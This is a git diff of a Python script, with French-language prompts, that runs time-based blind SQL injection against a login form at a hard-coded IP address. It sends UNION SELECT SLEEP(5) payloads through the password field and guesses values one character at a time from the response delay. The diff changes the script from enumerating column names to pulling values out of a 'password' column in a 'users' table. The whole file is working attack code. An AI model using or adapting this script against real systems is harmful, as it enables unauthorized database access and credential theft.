@@ -1,8 +1,8 @@
 import requests
 import time
 
-def column_name(database, table):
-    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
+def column_name(database, table, colonne):
+    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
     columns_name=[]
     a=0
     texte = ""
@@ -10,7 +10,7 @@ def column_name(database, table):
     url = "http://51.15.136.118/pageid.php"
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
-            if a > 27:
+            if a > 31:
                 if texte != "":
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
@@ -22,7 +22,11 @@ def column_name(database, table):
                 else:
                     break
             usr = "idc"
-            passwd = "' UNION SELECT SLEEP(5),1,2 COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
+            """while id != null:
+                passwd = "' UNION SELECT SLEEP(5),1,2 username WHERE id = '1' and username like 'a%' -- "
+                passwd2 = "' UNION SELECT SLEEP(5),1,2 password WHERE id = '1' and password like 'a%' -- " 
+                id += 1 """
+            passwd = "' UNION SELECT SLEEP(5),1,2 " + colonne + " FROM " + table + " WHERE " + colonne + " like '" + texte + dictionary[j] + "%' -- "
             print(passwd)
             start_time = time.time()
             response = requests.post(url, data={'username': usr, 'password': passwd})
@@ -41,15 +45,9 @@ def column_name(database, table):
                 a = 0
                 break
     print(columns_name)
-    b=0
-    for x in columns_name:
-        b += 1
-        print("Table {} : {} ".format(b, x))
-    c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
-    print("Vous avez choisi {}. ".format(columns_name[c-1]))
-    final_db=""
-    jsp3 = final_db + "".join(columns_name[c-1])
-    print(jsp3)
-    return jsp3
 
-column_name()
+
+z = "nom_user_db"
+zz = "users"
+zzz = "password"
+column_name(z, zz, zzz)
